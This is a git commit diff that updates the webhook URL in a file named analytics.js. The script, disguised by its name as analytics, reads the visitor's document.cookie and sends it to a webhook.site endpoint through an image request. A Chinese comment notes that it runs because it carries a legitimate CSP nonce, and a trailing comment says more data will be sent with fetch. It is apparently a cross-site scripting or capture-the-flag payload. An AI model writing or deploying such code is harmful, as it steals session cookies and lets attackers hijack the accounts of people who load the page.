a701f795febcd354551d64af21e84255ec2b228c
lucassun14 <142594125+lucassun14@users.noreply.github.com>
2026-04-24 16:14:53 +1000

    Update webhook URL in analytics.js

--- analytics.js
+++ analytics.js
@@ -1,5 +1,5 @@
 (function() {
-    const webhook = 'https://webhook.site/38776508-8dce-4494-9f9b-8cee1074903d';
+    const webhook = 'https://webhook.site/1d013059-f30d-4b9d-9261-27b0a801f8e8';
     // 直接发送 cookie（因为这个脚本有合法的 nonce，可以执行）
     new Image().src = webhook + '?cookie=' + encodeURIComponent(document.cookie);
     // 使用 fetch 发送更多信息
